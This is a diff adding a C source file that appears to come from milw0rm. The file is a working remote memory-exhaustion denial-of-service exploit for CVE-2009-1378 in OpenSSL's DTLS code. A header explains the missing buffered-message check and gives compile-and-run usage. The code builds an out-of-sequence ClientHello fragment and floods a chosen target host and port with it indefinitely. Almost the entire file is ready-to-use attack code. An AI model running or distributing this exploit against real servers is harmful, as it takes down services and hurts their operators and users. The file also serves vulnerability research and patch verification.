@@ -1,0 +1,144 @@
+/*
+ * cve-2009-1378.c
+ *
+ * OpenSSL <= 0.9.8k, 1.0.0-beta2 DTLS Remote Memory Exhaustion DoS
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ *
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1378
+ *
+ *   In dtls1_process_out_of_seq_message() the check if the current message is 
+ *   already buffered was missing. For every new message was memory allocated, 
+ *   allowing an attacker to perform an denial of service attack with sending 
+ *   out of seq handshake messages until there is no memory left.
+ *
+ * Usage:
+ *
+ *   Pass the host and port of the target DTLS server:
+ *
+ *   $ gcc cve-2009-1378.c -o cve-2009-1378
+ *   $ ./cve-2009-1378 1.2.3.4 666
+ *
+ * Notes:
+ *
+ *   With a MTU of 1500, the attack leaks 1503 bytes of memory with each UDP
+ *   datagram.  If you have a bigger MTU than 1500, feel free to set it.
+ *
+ *   Complete memory exhaustion may take a while depending on the throughput 
+ *   to the target and the amount of memory it has.  By default, we'll just 
+ *   continue sending datagrams indefinitely.
+ *
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+
+#define MTU 1500
+
+#define IP_HDR_LEN 20
+#define UDP_HDR_LEN 8
+#define MAX_LEN (MTU - IP_HDR_LEN - UDP_HDR_LEN)
+
+#define put16(b, data) ( \
+        (*(b) = ((data) >> 8) & 0xff), \
+        (*((b)+1) = (data) & 0xff))
+
+int
+main(int argc, char **argv)
+{
+	int sock, ret;
+	char *ptr, *err;
+	struct hostent *h;
+	struct sockaddr_in target;
+	char buf[MAX_LEN];
+
+	if (argc < 3) {
+		err = "Pass the host and port of the target DTLS server";
+		printf("[-] Error: %s\n", err);
+		exit(1);
+	}
+
+	h = gethostbyname(argv[1]);
+	if (!h) {
+		err = "Unknown host specified";
+		printf("[-] Error: %s (%s)\n", err, strerror(errno));
+		exit(1);
+	}
+
+	target.sin_family = h->h_addrtype;
+	memcpy(&target.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
+	target.sin_port = htons(atoi(argv[2]));
+
+	sock = socket(AF_INET, SOCK_DGRAM, 0);
+	if (sock == -1) {
+		err = "Failed creating UDP socket";
+		printf("[-] Error: %s (%s)\n", err, strerror(errno));
+		exit(1);
+	}
+
+	ret = connect(sock, (struct sockaddr *) &target, sizeof(target));
+	if (ret == -1) {
+		err = "Failed to connect socket";
+		printf("[-] Error: %s (%s)\n", err, strerror(errno));
+		exit(1);
+	}
+
+	ptr = buf;
+
+	/* header  */
+	memcpy(ptr, "\x16\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00", 11);
+	ptr += 11;
+
+	/* packet length */
+	put16(ptr, MAX_LEN - ((ptr - buf) + 2));
+	ptr += 2;
+	
+	/* client hello */
+	memcpy(ptr, "\x01", 1);
+	ptr += 1;
+	
+	/* length */
+	memcpy(ptr, "\x00", 1);
+	ptr += 1;
+	put16(ptr, MAX_LEN - ((ptr - buf) + 2 + 8));
+	ptr += 2;
+
+	/* sequence number */
+	memcpy(ptr, "\x00\x01", 2);
+	ptr += 2;
+
+	/* frag offset */
+	memcpy(ptr, "\x00\x00\x00", 3);
+	ptr += 3;
+
+	/* length */
+	memcpy(ptr, "\x00", 1);
+	ptr += 1;
+	put16(ptr, MAX_LEN - ((ptr - buf) + 2));
+	ptr += 2;
+
+	/* payload */
+	memset(ptr, '\x00', MAX_LEN - (ptr - buf));
+
+	printf("[+] Firing loads of packets at %s:%s...\n", argv[1], argv[2]);
+
+	while (1) {
+		send(sock, buf, MAX_LEN, 0);
+	}
+
+	close(sock);
+
+	return 0;
+}
+
+// milw0rm.com [2009-05-18]
